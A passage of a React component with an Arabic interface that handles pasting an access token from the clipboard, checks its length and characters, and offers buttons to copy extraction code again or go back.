                          if (text) { setTokenInput(text); setAutoPasted(true); setTokenValid(text.length > 50 && /^[A-Za-z0-9._-]+$/.test(text)) }
                        }).catch(() => {})
                      } catch {}
                    }} className="px-3 py-2.5 rounded-xl font-bold text-[10px] cursor-pointer bg-white/5 text-white/40 border border-white/10 hover:bg-white/10 transition-colors">
                      📋 لصق
                    </button>
                  )}
                </div>
                {tokenInput.length > 0 && tokenInput.length <= 50 && (
                  <p className="text-[9px] text-red-400/60 mt-2">❌ التوكن قصير جداً - تأكد أنك نسخته كامل</p>
                )}
                {tokenValid === true && (
                  <p className="text-[9px] text-green-400/80 mt-2">✅ التوكن صالح! اضغط &quot;استخدام&quot;</p>
                )}
              </div>

              {/* Bottom buttons */}
              <div className="flex gap-2">
                <button onClick={startExtract} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
                  📋 نسخ الكود مرة ثانية
                </button>
                <button onClick={() => setPhase('main')} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
                  🔙 رجوع
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  )
}
